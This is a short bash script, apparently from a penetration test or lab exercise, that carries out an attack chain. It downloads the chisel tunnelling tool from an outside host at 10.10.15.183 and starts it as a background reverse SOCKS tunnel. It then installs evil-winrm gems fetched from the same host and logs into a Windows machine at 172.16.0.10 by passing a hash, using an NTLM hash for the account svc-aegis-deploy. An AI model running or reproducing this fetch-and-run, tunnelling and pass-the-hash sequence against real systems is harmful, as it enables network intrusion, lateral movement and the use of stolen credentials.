#!/bin/bash
set -e
# chisel on 8092
pkill -9 -f 'chisel client' 2>/dev/null || true
curl -s -o /dev/null -w "p8092:%{http_code}\n" --connect-timeout 3 http://10.10.15.183:8092/ || echo fail8092
curl -fsSL -o /tmp/chisel http://10.10.15.183:8090/chisel_linux
chmod +x /tmp/chisel
nohup /tmp/chisel client 10.10.15.183:8092 R:socks >/tmp/chisel.log 2>&1 &
sleep 3
cat /tmp/chisel.log

# gems without native
cd /tmp
curl -fsSL -o ew_gems.tgz http://10.10.15.183:8090/ew_gems.tgz
rm -rf gems && mkdir gems && tar -xzf ew_gems.tgz -C gems
cd gems
# skip stringio and ffi native gems
for g in *.gem; do
  case "$g" in
    stringio*|ffi-*) echo "skip $g";;
    *) gem install --user-install --local --ignore-dependencies "$g" 2>&1 | tail -2;;
  esac
done
# now install with deps that are local
gem install --user-install --local multi_json-*.gem rubyzip-*.gem builder-*.gem erubi-*.gem nori-*.gem gyoku-*.gem logging-*.gem logger-*.gem fileutils-*.gem httpclient-*.gem rubyntlm-*.gem gssapi-*.gem winrm-*.gem winrm-fs-*.gem evil-winrm-*.gem 2>&1 | tee /tmp/gem2.log | tail -30
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
export GEM_HOME="$HOME/.local/share/gem/ruby/3.3.0"
ruby -e 'gem "winrm"; puts "winrm ok"' 2>&1
evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa -c whoami 2>&1 | tee /tmp/ew2.out
echo EW2_DONE
